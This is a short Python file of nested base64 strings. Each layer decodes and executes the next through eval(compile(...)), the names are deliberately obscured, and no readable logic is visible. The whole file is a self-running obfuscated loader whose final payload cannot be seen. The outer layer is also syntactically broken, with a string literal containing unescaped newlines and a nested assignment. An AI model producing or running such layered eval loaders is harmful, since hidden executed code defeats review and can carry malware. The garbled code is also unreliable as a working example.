import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVG5wa01Vd3diRFZSYWtwb1ZucEJNbGRzYUc5a01XeFlUbGQwYTFJd1duQlVNalZQWkVac1dWTnFRbWhXZWxaeVYyeGpNVTFGT1hWVmJXaGFZbXMwZDFscVRrSlBWVFZGWTBod2FVMXNiM2RhUldSSFlWZE5lbFZ1V21wU1JFRjNWREkxVDJJeVJsaFhha0pyVFcxNGNscEZaRzVQVlRWRllqQjBTbVZWUmpCVE1tdDNXakZyZVU5WGRHaFdlbFoxVkRKc1EwMVhVa2hYV0ZKUVVUQkdNRk15YTNkVE1HdzFUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSazEzVXpGd2RWTnVXbWxWTUVveVdUQmtWMlJXY0ZsVGJtUktVako0TUZrd1l6VmxWMUpFVVcxb2FsSXlkSHBUVldSaFkwWndXR1ZIZEdwbFdHUnVXV3hqTldFeGNGaGxTSEJOVVRCS2JWRXlNV0ZsVjBsNVRVZGtZVkl3V1hkWGJHaFRZMGRLV0ZaWFpHaFdla1l6V1dwT1MwMUZiRWhWYldoclVqRlpkMWxXWTNoaVJYaElWVzFvYTFJeFZreFhiVFZMWkcxS1ZGRnVXbXBTTVZveFYyeG9TMlF3ZUhSV2FsSmFUV3hhTTFwRlpITmtiVXAxVkZka2FGWjZSak5aYWs1TFRVVnNSMWR0YUdsU01uaHlWMVpvVTJOSFNYbE9WVnBxWW10d01sa3liRFJXYlUxNVZtNXNVMWRGY0RWWmFrNUtVekJPZEZSdVRscFhSVFUyVTFWa1MwMVhUWHBTYWtaWlRXczFNbGx0TVdGalIwNTBUVmRvV2sxdGVESlpiV3h2WkVkSmVWVnRlR2xUUlRFeFZrWmpOV0V4Y0Zoa00wSlFXakk1YmxOVlRrSmFNV2Q1VGxkb2FWWXhWbTVWUms1Q1lteHNkVlp1Y0dwWFJscHRWMVJKTldSV2NIUmlTR3hwVmpCYWNWbFdZelZrVlhBellqSmtTbEV3Um01WFJFcFRZa2ROZVZSdWJHaFhSVWwzV1Zaak5XUlZiRVZOUjJSclZUQndSR1I2WkhkbGJVNVpWbTE0WVZJd1ZtNVhhMlJXV2pGcmVVOVlWbUZpVjNnMVdXeGtSMkZ0Um1wVU0zQnBZVlZzVEZOVlRrSmFNR3hIVDFoc1lWWXdOVzFaYlRGSFpFWndWRkZVYkVwUk1sSXhXV3BKZUdGWFRuUldWelZFWVZWR2JsTlZUa05oTVhCWVYxZGtZVlo2VlhsWlZtUkhaVlpuZWxSdVdtbFNNbmh4V1Zab1UwMVdjRVJoU0hCaFZqTm9kRlJGVGtOaGJVNXdaREprYTFZeWVISlVSVTVEWTBad1NWUllUa3BTTURVeVdXMDFVMkpIVmtsVlZHeFZZbFJzTVZkc1RuSk9hMDV3VVZka1NsRXdSbTVUVlU1Q1dqSk9kRlp0TlVwU1JFSnVXWHBLVjJNeGNIQk9WMnhxWWxScmVsbDZTbFppTVd0NlUxaE9TbE5HV25kWGEwNHpXakpHV0ZWdWNFMVJNRXB4V1dwSk1VMUdjRmxoUkVKUlZqQTFNbGx0TlZOaVIxWkpWVmhDV0dWclNtdFJNbXhDV2pCc1JGRlhaRXBSTUVadVYxY3dOV0V5VmxSUlZHeEtVVEpPZFZFeWJFSmFNR3hFVVZka1NsRXdSbTVYVnpBMVlUSldWRkZZU2xGVk1FWndXWHBKTldNeVJsaFVia0pyVTBaYWNsUXliRmRsYTNoRVUxZGtTMVV3Um5aWk1qRlhZbXQ0ZEdKSGRFeFZWemx1VTFWT1Fsb3diRVJSVjJSS1VqQndNbGRyYUhKYU1IUTJUVWRrU21KVVZqSlpiR1JMWlZad1ZXSXllR3BsV0dSd1UxVk9WbG93ZEVsVGJYaGhaVlJXTVZscVNYaGhWMDUwVmxoQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkZwaVZHeHlXbFpPUW1Oc1FsUlJWMnhhVjBWS2MxbHJaRFJqUm5CSVQwaG9VR0ZXV2paVVJVNUtXakJ3VkZGWE9XcGlWbHAxVkVjeFIyUXhjRmhsU0U1b1ZqRktNbFJXVG5KVE1HeEVVVmRrU2xFd1JtNVRWVTVEWVZkSmVWVnFWa3BSTTAwMVUxVk9TMkZIVGtoV2JrNXBVako0Y2xsdWNFcE9hM0JaVkZoT1NtRlZSbk5UVlU1dlpWWndXRmt6VmxwWFJVcHpXV3RrTkdOR2NFaFBTR3hNVlZjNWJsTlZUa0phTUd4RVVWZGtTbEl3Y0RKWGEyaHlXakIwTmsxSFpFcGlWbkJ6VjFSS2IyRkdaM2xPVjJoYVpXMDVjMWt6YkROaFZXeEVWbGRrVEZORk5IZFpNbXh2WlZad1dGa3pWbUZpVmxweFdWVmtSMXB0U25SU2JYQk1WVEowVEZOVlRrSmFNR3hFVVZka1NsRXdTbkJaYWtwVFRsVnNSR042YkVwUk1IQjZXa1prYTJGSFRuTlBXRlphVmpBd01sTnNhRTVqTUd4d1VWZDRTbEV5YURWWGJHUnFaRmRLU1ZadE5WcFhSWEJ0V1cweFIyRnJkRkppTW1SS1VUQkdibE5WVGtKYU1HeElVMjVhWVZOSGRHNVRNMjkzV2pCc2RGZHRlRnBOYldodlYwUktUMlJ0U25SWGJrSnFZVzA1YzFremJETmhWV3hFVmxka1RGTkZOSGRaTW14dlpWWndXRmt6Vm1GaVZscHhXVlZrUjFwc2EzbFBXRlpoWWxkNE5WTXhUbkpUTUd4RVVWZGtTbEV3Um01VFZVNURaRVpzV0dKSVRsbE5hbXh3V1Zkc1FrOVZiRWxVYlhocFVqRnNNVmt3WXpWa2JVcEVUbGMxWVZkR1JuWlRha2w0WVVkR1dHUXpWbWxXTVZvMldYcEtSMkpzY0ZSWk0wSkVZVlZHYmxOVlRrSmFNR3hFVVZka2FVMHdTbkZYUkVwUFpHMUtkRmR0V21sTmEzQjRVMVZSZDFveVRYbFdiazVoWVZSV00xbHFTVFZqTUhoMFdrZDRhMUV5WkhWWmFrNURZVzFHV0U5WVZtRlhSVFZ0VjFSSk5XUldjSEJaTTBKRVlWVkdibE5WVGtKYU1HeEVVVmRrV2sxcWJEVlpNakZYV214cmVVOVlWbUZpUkd3eVYxY3hkbG94UWxSUmJuQmhWak5vZEZSSE5VTmtiVWw1WkROV1lVMXNXWGRUTUU1clpXeHNXRlJ1YkZwV2FteHhXV3BPUzJWV2NGaFBWMXBhVFdwc01WZHRNWE5pYTNBMVlUQjBTbEV3Um01VFZVNUNXakJzUkZGdVdtcFNNRFZ0VjFSSk5XUldjSE5QV0VKaFUwVXhibFZHVGtOa2JVNUlWRzFhV2sxcWJERlhiWGMxWkd4c2RHSXpWbXBOYkZwdldUSXhUMkl3ZEVoVWJteE5VVEJKZUZsV1pGSmpNR3hIWkVkU1RWRXdTbkZaYWtreFRVWndXV0ZFUWxGV01EVXlXVzAxVTJKSFZrbFZXRUpFWVZWR2JsTlZUa0phTUd4RVVWZGthVTB3U25GWFJFcFBaRzFLZEZkWFpGRlZNRW95V1RCa1QxcHNhM2xQV0ZaaFlrUnNNbGRYTVhaa1ZteDFVMjVhYTAwd05YTlRNR1JQWlZWNFJGRnFSbWhXTVVaNldXcE9RMkZzWjNsVWJscHBZbFp3YlZsV1pGTmxhM2hJVkc1YWFXSnNTbk5hVldoU1QxWnJlVTlZVm10U01Wa3dXa1ZPYzFsck1VZE5SMlJvVmpGc2JsbHFUa05oYkdkNVZHNWFhV0pXY0cxWlZtUlRaV3RzU0ZadVRtcE5iRlp1Vmtjd05XUldjRkppTW1SS1VUQkdibE5WVGtKYU1HeENZakprU2xFd1JtNVRWVTVDV2pCc1NGUnVXbXBpYTNCeldXcEZOV05HY0VsVVYyUlJWVEJLY1ZscVRrdGxWbkJYVDFkd2FVMXFWblJYUkVrMVlWZEdjRTVZY0dGV01GbzFWMVJLYm1JeGEzcFRXRTVLVTBaYWQxZHJUak5hTVdRMVdqSTFhbUpXV205WmEyUnpUbXhuZWxSdVdtbFNNbmh4VTI1c00ySnNRbFJaTTA1WFUwVnZlRmRzVG5OYVJYaEVVVzF3YVUxcVZYZFhiR2h2VFVaQ1dGUnVXbWxpYkVweldsVm9VbU5GVG5CUlYyUktVVEJHYmxOVlRrSmFNWEJZVFZkb2FGWXphRzFhUldNMFdqRkNWRkZYTlV0a01qbHVVMVZPUWxvd2JFUlJWMlJLVWpGYU1GZFdaSE5qTVdkNVZHMXdTbEpFUW01VGJteHFVekJzUkZGWFpFcFJNRVp1VTFWT1EyTkdjSEJSYlhCcFRUQndOVmRzWXpWYWJVWllWVzV3VUZveU9XNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RMkZ0U1hwVGJteGhWbnBzYlZscVNrdGpWMDQxVVZSc1NsSXdOVEpaTWpWTFlrWm5lVlJ1V21saVZuQnRXV3BLUzJOVmVIUlRibXhwVFRKU05sZHNUbTloYlU1d1pESmthMVl5ZUhKVVJVNURZVzFKZWxOdWJHRldlbXh0V1Zaa1UyVnJlRVJSYlhCcFRXcFZkMWRzYUc5TlJrSllWRzVhYVdKc1NuTmFWV2hTWTBWT2NGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVakZhTUZkV1pITmpNV2Q2Vlc1YVNsSkVRbTVYVkVrMVpWZE9kRlp1V2xsTmFteHdXVmMxVDFsck1VZE5TRlphVFdwc05Wa3lNVmRrYTA1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFNNbmgwVTFWa05HSkhTbkJoUjNCcFRUQndOVmRzWXpWYWJVbDVVMjVHYW1WWGRHNVZSMnhDWlVVNWJtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNV3Q1VDFoc2FtSldXakpYUkVrMVlWZEdkVlJZVm1wU2Vtd3pVekJTUW1ORlRuQlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNURZekpHV1ZScVFscFdhbXh4V1dwT1MyVldjRmhQUjJSUlZUQkthVmRVU1RSa1ZtdDVUMWhzYW1KV1dqSlRWV1JoWkcxT2NGRnRjR2xsVlVwM1dXMXNRMkZ0U1hwVGJteGhWbnBzYlZscVNrdGpWMDE0VFVWMFNsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFaFdibEphVmpKNGVsZEVTazloYTJ4RlRVZGtTMlZZWkhWVVJ6RjNaRzFHV0U1SE9XbFNNbmcyV2tWa1IxcHNhM2xQV0d4cVlsWmFNbE14Um5aYU1HeEVVVmRrU2xFd1JtNVRWV040Wld4dmVFOVVTbHBXTTJnMlUxVlJkMW95VmpOaU1tUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSblZaZWs1WFlWZEdkRlp0Y0d0Uk1rMHlVMVZPYTFFeVVsbFViWEJhVjBWc2JsZFVTVFZrVm5CMFlraHNhVll3V25GWlZtTTFaRlZ3TldRd2RFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5xU2xOaFIxSklWbGMxVUdGVlNuSlhWbWhUWWtkU1NHSklVbUZWZWxZeFdXcE9hbUl3ZEZST1dIQnJVMFZ3ZEZwRlpITmtSbkJVV2pJMVMxWnRkREJUYkdOM1pFVndXRlZYTlV4Vk0yUk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUc5NlZtNXdZVmRGY0cxWlZtUlNZbXM1Y0ZGcVJtaFdNVVo2VVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVXa2hTYVUxc1NuTlphMDVxVG10c1JGcEhiR3RYUlRVMFdrWlpOV0Z0U1hsT1Z6Rm9WMFZ3TUZkV1pFOWpSMGw1VGtjMVRWRlhPVzVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUW1KdFRuUldibkJaVFcxNGNsTnVjSFphTWs1MFZtMDFUVkZYT1c1VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1FtSnNiSFJQVjNSc1ZtcHJkMWRzYUc5TlJYQTJZakprV21KVWJISmFWazR6VXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUkxUV3hhTUZkV1pITmpNV2Q1VjI1c2FVMXFRblZVTW14RFpHMU9TRlJ0V2xwTmFtd3hWMjFyTVdGdFNYcFRibXhoVm5wc2JWa3lNVmRrUjBaWlZWZGthRll4Ykc1WmFrNURZV3huZVZSdVdtbGlWbXh1VjJ4a05HVnNjRlJSVnpWTFpWaGtURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCdmVWWnVVbHBXTW5oNlYwUk9VMlJyY0RaaU1tUmhWbnBHYjFsV1pEUmFiVkpJVDBoT1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPYTJKSFNsaFNia0pwVW1wc2NWZFliR3BPYTJ4SVZtNVNXbFl5ZUhwWFJFcFBZV3Q0UW1JeVpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdkVmRzWTNoaFIwWllaVWRhV21KVk5YRlRibkIyWW10d05XUXdkRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOcVRrdGlSMDVJWlVSV1dVMHhTakpUYm5CMldqQndOVmt6VGtSaFZVWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUbXRrUm5CWlZHNXdXbFl5VW5OWFJFcHpZVEJ3Tm1JeVpGVmlWR3d4VjJ4T00xTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrUzAwd2NITlhiVEZYWlZad1dFNVhjR0ZYUlRGMVZESnNRMVF5U1hsT1YzaE5VVmM1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1ltMU5lbFp0Ykd0VFIzZ3pWMnhPYWs1cmJFUmFTR1JwVWpCYWQxbHRiR3BqTUU1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNbEoyVjJ4a1IyRXhjRmxUYm5CTFpXMDVibFpITURWa1ZuQlVaREIwU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUycEplR0ZIUmxobFIxcHFUV3hhTlZwSE1WZGxWbWQ1WWtkMFMyVnRPVzVXUnpBMVpGWndWR1F3ZEVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTnFUazlOUm14WlZXMTRTMlZ0T1c1VGFrazFUVmRTU0ZwSVdtaFdlbFoxVTI1c00xTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrUzAxcldYaGFSV00xV214d1NGWnVUbUZYUmtwelUyNXdkbG94U25SU2JrNXFUV3hXVEZOVlRrSmFNR3hFVVZka1NsRXdTVFZSTW14Q1dqQnNSRkZYWkVwUk1FWnVXV3hrUjJOSFNrZFBXRUpoVVRCRk5WTlZZM2hoUjBaWVpVZGFhVTFyY0hoVVJ6RlBaVlp3V0ZKcVFtRlZNbWh4V1RKc00xb3lVbGhpUjNSTlVUQktNRmw2U210YWJWSjBVbTVPYW1WWVpHNVhWRWsxWkZkU1NGWnFVbXRSTW5STVUxVk9RbG93YkVSUlYyUktVVEJLTlZkc2FFOWtNR3hGVFVka2FWWXdXbmRaYTFrMVpHeHNkR0l6Vm1wTmJGb3hWMnRPYjJGdFRuQmtNbVJyVmpKNGNsUkZUa05aYlVwWVVtNUNhVkpxYkhkWGExbDNZekJzUjFWdWJHdFdNVlo2VjFSSk5XUlhVa2hXYWxKclVUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1NqVlhiR2hUVFZkT2RFNUhaRXhUUlRWeldXdGtXbVJYVVhwVGJrSnJVakZXZGxkVVRrcGpNR3hKVm01Q1lWRXpaRzVaVm1SVFpXdDRSRkZxWkV0Tk1EUjNWMVpvVTJKRmNEWmlNbVJMVFVaYU1WcEhNWE5oUm5CSVQwYzFiVlV6Wkc1WFZFazFaRmRTU0ZacVVtdFNSRVp4V1dwSk1VMUdjRmxoUkVKTVZUQktkMWR0YkVObFZuQlpWRzVrU2xJeFducFpla3BXV2pGYVNWTnFSbUZWTW5STVUxVk9RbG93YkVKaU1tUktVVEJHYmxkdE1WZGhiVVpJVW0xYWFsSXhXWGRWUms1RFlsZEdXRlp1VG1GVFJURXhWV3RrUjAxR2NGUmhSRVpMVFVad2MxZFVTbTloUld4SVZXMTRTbEl6YUc5VFZXaERZa2RTU0dKSGNHaFpNRGsyV1cxc2FtTXdiRWxUYlhocVYwWmFkMWt5TVZkaE1VSldWMjFvYVZORk5YTlVSVTVEWVRGd1dGZHRhR3RXTTJkM1ZVWmtZV05HY0ZobFIzUnFaVlJXUmxkV2FGTmlSWGgwVkc1YWFXSnNTbk5hVldoVFdtMVNTRTlYZEZwWFIzUjNVVEpzUWxvd2JFUlJibFpwVFdwR2NGa3lNVlpQVld4SVYyNUNZVll6YUhKWk0yc3hVa2RHU0ZKdWJFeFRSbFoxVmtjd05XUkdiSFZUYlhoTVUwVXhkMU51YkROYU1rNTBWbTVvYTFZeWVEVlhiR1JTVDFaS2RGSnVUbXBOYkZaNlUxVm9UMk5IVm5SV1ZHeFBWa1ZHZDFFeWJFSmFNR3hFVVcxb2FsSXhXbnBaYTJSellUSktObEpVYkVwU01YQjNWMnhrTkdFeVRqVk9WVkpvVWpCYU5WTXdhRlppYXpGWVZtNXNTbEl3V2pOWGJHUTBZekpHV0ZWdVdrdGxXR1J1V1RJeFYyVkhVbGhpU0d4aFZqRkZOVlZ0TVVkak1rMTVWbGhPU2xORk5YZGFWekZXVDFVeE5sTllRa1JoVlVadVUxVk9RMkZIVGtoV2JrNXBVako0Y2xsdWNFcFBWV3hJVjI1Q1lWWXphSEpaTTJzeFVrZEdTRkp1YkV4VFJsWjFWRmN4VTJScmJFaFNibVJoVmpOb2VsbFdaRk5rYTNBMVpESmthbUpXV2pSYVJtUnpaVlp3V0ZWVWJGTmlWVnA2V1hwS1ZtTXdiRWxVYmtKc1lsWlZOVlJZY0VwalJVNXdVVmRrU2xFd1NuUlhiR1JQWWpGc1YwOVlWbHBXTURBMVUxVmtZV05HY0ZobFIzUnFaVlJXUmxkV2FGTmlSWFJKVmxjMVUySldXbkZaVldSR1dqRndTRlpYWkdsaVZWcHhXVlpqZUdOR2NGaE9WRUpwWlZkT2VsTlZhRXRpUjA1WlZtNUNhbUpXV25KVlJsWmhZVWRLU1ZSdGVFeFZWemx1VTFWT1Fsb3lTa2xXYlRWYVYwVndiVmx0TVVkaGJFSlVVVzB4YUZZeFducFhhMmhPWkZaRmVXRkhhR3BoVjJkNFUycENORTFXYjNsU2JteEtVakZLYzFOVll6RmhSbXQ1WWtoU2FGWXhXakZhUldNMFltdDRSRkZ1YkdGWFJWbDRXVlpvUzJKR2NFVk5WV1JhVmpOb05sZHNUak5hTWsxNVlrUmFZVlpFUVhsVWEwNXlVekJzUkZGWFpFcFNNWEJ6VjFSS2IyRkdaM2xVYmxwcFlsWndkMWt5YjNkYU1YQjBZa2Q0YVZJeFNqWlVSM1JUWVVkU1NGWlhPV3RWTWxKSVYyeGtUMkl4YkZSUmJYUmhWak5rYmxkVVNUVmtWbkIwWWtoc2FWWXdXbkZaVjA1UVpXMUtjRmt6VGtwVFJYQnpXVEZvVjJOSFRuUldiWFJSVmxad2IxbHJhRTlpUlhSU1lqSmtTbEV3Um01WmVrNVRZVWRTU0ZaVWJFcFNNWEIzVjJ4a05HRXlUalZPVmxKaFZqTm9jMWRVVGxOalIwbDVUa2M1V0dWWFpIVlZWRTVMWWtac1dGVnVXa3RsV0dSdVUycENUMlZXY0ZoU2JYUnBaVmRPZDFSRlRtNWliRXBZVGxSS2FGWXdXbkpaYm14cVl6QnNSRnBGV21saWJIQjNWMVprVTJScmNEVmhNMDVaVlROa2JsTnFRbGRsYlZKSVVtMTBhV1ZYVG5wVFZXaFBZMGRXZEZaVWJFNVdSbXg2VTFWb1MySkdiRmhWYmxwcFlsaG5NVlZHV2xObFYxSllWbGhPU2xJeFNuTlhiVEZIVFZkS1NWVlViRXROUlRVMVYyeGtSMkV5U2pWWk0wSkVXakk1Y1ZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVllRbkZaYTJSSFpXMU9OVkZ1YkdGWFJUVnRWMWMxVjJWdFRsbFdiVnBhVFdwc01WZHRNWE5sVlhSSVRWaGFZVkl4V25wWk0yc3hWRzFKZVZWdGVHbFJNbk15VVRKc1Fsb3diRVJSYlZwcFlsVmFNRmRzVGtKUFZXeEVXa2hzWVZkRk5XMVhWelZYWlcxT1dWWnRXbHBOYW13eFYyMHhjMlZWY0ROaU1tUktVVEJHYmxkRVNsTmlSMDE1Vkc1c2FGZEZTWGRaVm1NMVpGVnNSVTFIWkd0Vk1IQkZXV3BPUzJWV2NGaFBSMlJoVWpGV2JsZFlUbEJPYlUxNlVtcEdZVll4U205VFZXUlRZa1ZzU0ZSdVdtbGlWbkIzV1RJd2VHRkdhM2xpYTFKNlRXcFNjRkV5YkVKYU1HeEVVVzFhYW1KV1duRlhSRWt4WVVkS1dGWlhaRkZWTUVaMVdUQmtWMlZYVFhsUFdGWmFWbXBzY0ZkV2FGZE5SWEF6WWpCMFNsRXdSbTVUVldSTFRWZE5lbEpxUmxsTmF6VXlXVzB4WVdOSFRuUk5WMmhhVFcxNE1sbHRkelZqUm5CRlRVZGtZV0pYZUhOWmEyUlRaV3Q0Y2sxWGFHbGliWFExV1dwSk1XSkZkRVJhUjJ4clYwVTFORnBHV1RWaGJVbDVUbGN4YUZkRmNEQlhWbVJQWTBkSmVVNUhOVTFSTUVsNFUycEdRMkpIVWtoaVIzQm9XVEE1TmxsdGJFTmhNWEJVVVcxc00wNHpRalpaTVdoWFlrWndTRkpYTlUxUk1Fb3lXVzB4VTJKSFNraFdha0poVmtSQ2RWZFVTa2RsYkd0NVVtMTBZVlV5VG5wVFZXaExZa2RPV1ZadVFtcGlWbHB5VlVaV1lXRkhTa2xVYlhoTVZWYzVibE5WVGtKYU1XdDVUMWhzYW1KV1dqSlhSRXBQWkcxS2RGZHVRbUZOVkd4M1YydFJkMW94Y0hSaVIzaHBVakZLTmxSSGMzaGhSMHAxWVROc2FVMXFWbk5UTUU1clpXeHNXRlJ1YkZwV2FteHhXV3BPUzJWV2NGaFBWMXBhVFdwc01WZHRNWE5pYTNBMVpESmthMVV5VWtWWmFrNUxaVlp3V0U5SE5VMVJNRW95V1cweFUySkhTa2hXYWtKaFZrUkNkVmRVU2tkbGJHdDVVbTEwWVZVeVRucFRWV2hMWWtkT1dWWnVRbXBpVmxweVZVWldZV0ZIU2tsVWJYaE1WVmM1YmxOVlRrSmFNazUwVm0wMVdVMHdjSE5aZWs1RFdteHNkVlp1Y0dwVk1FVTFVMVZrWVdOR2NGaGxSM1JxWlZSV1ZsZHNhRzlOUlhSRVdrWldZVmRIWjNkWmJteERaVlp3V1ZSdVpHdFdNVm8yV2tWa1JtSnJkRkppZWpCcFEyMVdNbGxYZDI5Wk1qbDBZMGRzYzFwVGFHbFpXRTVzVG1wUmRWbHFXVEJhUjFacVlqSlNiRXRIT1ZCVWVrSjJZakk1VUZSNWEzTkpRMGs0WXpOU2VXRlhOVzVRYVVselNVTmtiR1ZIVm1wS2VXdHdJZ3BsZG1Gc0tHTnZiWEJwYkdVb1ltRnpaVFkwTG1JMk5HUmxZMjlrWlNodlQwOHdiMjl2VDA4cExDQWlQSE4wY21sdVp6NGlMQ0FuWlhobFl5Y3BLUT09IgpldmFsKGNvbXBpbGUoYmFzZTY0LmI2NGRlY29kZShvT08wb29vT08pLCAiPHN0cmluZz4iLCAnZXhlYycpKQ=="
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))